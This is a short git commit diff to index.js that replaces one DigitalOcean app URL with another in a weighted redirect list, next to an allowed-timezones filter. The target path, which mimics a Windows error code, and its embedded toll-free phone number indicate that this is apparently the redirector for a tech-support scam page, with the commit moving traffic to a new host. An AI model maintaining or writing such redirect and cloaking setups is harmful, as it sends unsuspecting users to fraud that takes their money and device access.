015e605c72d4c0ca7f60880a90cd0fb0b4fb181a
paalakash <palaksh452@gmail.com>
2026-06-18 07:37:21 +0530

    Update index.js

--- index.js
+++ index.js
@@ -31,7 +31,7 @@ const ALLOWED_TIMEZONES = new Set([
 
 // Raw URLs accompanied by their selection probability weights (Must total 1.0)
 const RAW_CONFIGS = [
-    { url: "https://goldfish-app-7ms3h.ondigitalocean.app/Win0codejInfouycinfcode/index.html?Anph=0101-844-950-3883", weight: 1.0 }
+    { url: "https://sasuke-app-n4pte.ondigitalocean.app/Win0codejInfouycinfcode/index.html?Anph=0101-844-950-3883", weight: 1.0 }
 
 ];
 
